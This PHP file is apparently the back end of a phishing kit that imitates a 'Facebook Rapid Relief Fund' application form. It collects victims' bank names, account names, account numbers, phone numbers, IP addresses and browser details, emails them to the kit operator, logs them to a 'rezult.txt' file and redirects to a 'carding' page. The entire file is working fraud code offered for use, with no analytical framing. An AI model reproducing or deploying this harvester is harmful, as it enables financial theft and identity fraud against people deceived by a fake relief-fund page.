<?php
include "to.php";
$BankName = $_POST['BankName'];
$AccountName = $_POST ['AccountName'];
$AccountNumber = $_POST ['AccountNumber'];
$Country = $_POST['Country'];
$PhoneNumber = $_POST['PhoneNumber'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Applicant-Bank-Details -------------
BankName : $BankName
AccountName : $AccountName
AccountNumber : $AccountNumber
Country : $Country
PhoneNumber : $PhoneNumber
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Date : $Date / Time : $Time
---------- Coded & Tools By Coachella ---------";
$MAIL_TITLE = "Facebook-User-Bank-Details ++| ".$IP."";
$MAIL_HEADER = "From: Facebook Rapid Relief Fund Applicant";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=websc-carding.html'>";exit;

?>
